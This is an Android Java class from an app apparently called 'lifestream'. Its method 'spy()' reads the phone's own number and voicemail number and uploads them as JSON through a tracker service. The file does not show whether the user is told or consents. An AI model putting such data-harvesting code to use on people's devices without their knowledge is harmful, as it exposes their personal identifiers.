package net.datadeer.app.lifestream;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.telephony.TelephonyManager;

import androidx.core.app.ActivityCompat;

import org.json.JSONException;
import org.json.JSONObject;

class TrackerPhoneNumbers extends TrackerMethod {
    public TrackerPhoneNumbers(){this("Phone");}
    public TrackerPhoneNumbers(String name) {
        super(name);
    }

    @Override
    public void spy() {
        if (
            ActivityCompat.checkSelfPermission(getContext(), Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED &&
            ActivityCompat.checkSelfPermission(getContext(), Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED &&
            ActivityCompat.checkSelfPermission(getContext(), Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED
        )
            return;
        TelephonyManager tMgr = (TelephonyManager) getContext().getSystemService(Context.TELEPHONY_SERVICE);
        try {
            JSONObject ret = new JSONObject();
            ret.put("Line1Number", tMgr.getLine1Number());
            ret.put("VoiceMailNumber", tMgr.getVoiceMailNumber());
            TrackerService.uploadJSON(this,ret);
            doneSpying();
        } catch (JSONException | SecurityException e) {
            e.printStackTrace();
        }
    }
}